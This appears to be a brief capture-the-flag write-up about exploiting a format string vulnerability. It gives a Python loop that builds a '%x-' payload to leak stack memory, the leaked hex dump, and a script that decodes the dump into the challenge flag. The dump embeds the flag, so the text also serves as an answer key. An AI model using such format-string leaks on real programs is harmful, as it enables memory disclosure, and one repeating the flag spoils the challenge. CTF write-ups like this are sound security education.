This was challenging because it involves format string vulnrabilities. You print %x-%x enough times and get the token.

After that you need to bend over backwards to get the flag from this place.

```
# Print %x-%x-%x 40 times
for _ in range(20):
    print("%x-%x-", end="")

# Add a newline at the end
print()

```


```
x = "9d2d3b0-804b000-80489c3-f7f12d80-ffffffff-1-9d2b160-f7f20110-f7f12dc7-0-9d2c180-1-9d2d390-9d2d3b0-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-62633763-65616336-ffce007d-f7f4daf8-f7f20440-f7235000-1-0-f7dafce9-f7f210c0-f7f125c0-f7f12000-ffce7798-f7da068d-f7f125c0-8048eca-ffce77a4-0-f7f34f09"
s = ""
for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

print(s)
```
